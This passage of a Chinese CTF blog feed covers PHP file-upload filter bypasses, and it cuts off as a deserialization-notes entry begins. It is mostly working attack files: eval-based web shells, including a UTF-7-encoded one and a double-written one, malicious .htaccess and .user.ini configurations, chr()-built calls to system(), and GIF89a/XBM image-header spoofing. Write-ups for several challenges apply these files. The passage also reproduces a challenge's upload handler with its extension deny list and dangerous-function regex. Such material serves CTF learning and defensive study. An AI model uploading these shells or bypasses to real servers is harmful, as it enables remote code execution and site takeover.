title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h3><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>.htaccess</code>解码对应的文件，例如可以使用UTF-7进行解码：(<a href="https://www.novel.tools/encode/UTF-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89">https://www.novel.tools/encode/UTF-7这个网站可以编码和解码UTF-7）</a></p><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><?php @eval($_POST['cmd']);?></blockquote><br><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>pphphp@<span class="token function">eevalval</span><span class="token punctuation">(</span><span class="token variable">$_PPOSTOST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><br><h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>假如<code>.htaccess</code>被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。</p><ul><li>1.aaa</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>.user.ini</li></ul><pre class="line-numbers language-none"><code class="language-none">auto_prepend_file&#x3D;1.aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>加载其它php文件的时候，会先加载<code>.user.ini</code>里的<code>1.aaa</code></p></blockquote><br><h3 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h3><p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p><p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p><pre class="line-numbers language-none"><code class="language-none">AddType appli\cation&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>过滤掉application，则使用换行绕过</p></blockquote><br><h3 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h3><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaaphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><h3 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h3><p>对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。</p><p>使用脚本快速生成指定函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"chr("</span><span class="token operator">.</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111)</p><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><br><h3 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h3><p>上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。</p><h4 id="XMB文件头绕过"><a href="#XMB文件头绕过" class="headerlink" title="XMB文件头绕过"></a>XMB文件头绕过</h4><pre class="line-numbers language-none"><code class="language-none">#define test_width 16#define test_height 7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">#define test_width 16#define test_height 7&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><pre class="line-numbers language-none"><code class="language-none">GIF89a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">GIF89a&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h3><p>发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过</p><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在根目录下找到flag。</p><p><img src="https://s1.ax1x.com/2020/08/10/abJwIH.png"></p><blockquote><p>或者</p><p>cat /flag</p><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100628.png"></p></blockquote><br><h3 id="upload3"><a href="#upload3" class="headerlink" title="upload3"></a>upload3</h3><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php@eval($_POST[&#39;cmd&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现php，eval，POST被替换为空，使用双写绕过。</p><p><img src="https://s1.ax1x.com/2020/08/10/abYTtH.png"></p><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-pphphp .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?pphphp@eevalval($_PPOSTOST[&#39;cmd&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><h3 id="upload4"><a href="#upload4" class="headerlink" title="upload4"></a>upload4</h3><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php@eval($_POST[&#39;cmd&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/08/10/abUytg.png"></p><p>发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。</p><p>几次尝试后发现，它对文件内容进行检查，不能含有<code>&lt;?</code>，且无法用其它标签绕过。</p><p>尝试使用特殊编码绕过，上传.htaccess和1.aaa</p><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在根目录下找到flag。</p><blockquote><p>找到flag之后查看php版本为：7.0.33</p><p>尝试发现：</p><p><img src="https://s1.ax1x.com/2020/08/11/aLcYOU.png"></p><p>由于版本为7.0以上且过滤掉<code>&lt;?</code>，所以无法使用其它标签绕过。</p></blockquote><br><h3 id="upload6"><a href="#upload6" class="headerlink" title="upload6"></a>upload6</h3><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示：内容不能有application</p><p>尝试使用.htaccess文件换行绕过。</p><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType appli\cation&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php@eval($_POST[&#39;cmd&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><h3 id="upload7"><a href="#upload7" class="headerlink" title="upload7"></a>upload7</h3><ul><li>.htaccess</li></ul><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php@eval($_POST[&#39;cmd&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传1.aaa 提示：不能含有危险函数！</p><p>使用burp suite抓包看看，发现eval和POST被过滤了。</p><p>尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。</p><ul><li>1.aaa</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出：system</p></blockquote><p>PS：</p><p>ctf-wscan下载地址：<a href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p><p>做题前可以先扫扫看有没有备份文件</p><p>像<code>robots.txt </code>、<code>www.zip</code>。</p><ul><li>使用扫描器扫描发现存在备份文件</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png"></p><ul><li>下载备份文件</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png"></p><ul><li> 把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li></ul><pre class="line-numbers language-none"><code class="language-none">vim -r index.php.swp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>得到源代码</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//设置上传目录</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPLOAD_PATH"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"../upload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$is_upload</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span><span class="token operator">=</span><span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span><span class="token operator">=</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span><span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span><span class="token operator">=</span><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui"</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"不能含有危险函数！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传成功"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img_path</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请重新上传！'</span><span class="token punctuation">;</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">,</span><span class="token number">775</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化漏洞</title>
      <link href="posts/20201008.html"/>
      <url>posts/20201008.html</url>
      
        <content type="html"><![CDATA[<p>php反序列化漏洞学习笔记</p><span id="more"></span><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>序列化</strong></p><ul><li><code>serialize()</code> 将对象转变成一个字符串便于之后的传递与使用。</li><li>序列化会保存对象所有的变量，但是不会保存对象的方法。</li></ul><p><strong>反序列化</strong></p><ul><li><code>unserialize()</code> 将序列化的结果恢复成对象。</li><li>反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 <code>spl_autoload_register()</code> (自动包含类)实现</li></ul><p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><br><h3 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h3><blockquote><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。</p></blockquote><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p><p><code>__construct</code> 当一个对象创建时自动调用</p><p><code>__wakeup</code> 使用unserialize()函数时会自动调用</p><p><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</p><p><code>__toString</code> 当一个对象被当作一个字符串被调用。</p><p><code>__sleep()</code> 使用serialize()函数时触发</p><p><code>__call()</code>  在对象上下文中调用不可访问的方法时触发 </p><p><code>__callStatic()</code> 在静态上下文中调用不可访问的方法时触发</p><p><code>__get()</code> 用于从不可访问的属性读取数据</p><p><code>__set()</code> 用于将数据写入不可访问的属性</p><p><code>__isset()</code> 在不可访问的属性上调用isset()或empty()触发 </p><p><code>__unset()</code> 在不可访问的属性上使用unset()时触发</p><p><code>__toString()</code> 把类当作字符串使用时触发,返回值需要为字符串</p><p><code>__invoke()</code> 当脚本尝试将对象调用为函数时触发</p><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$varr1</span> <span class="token 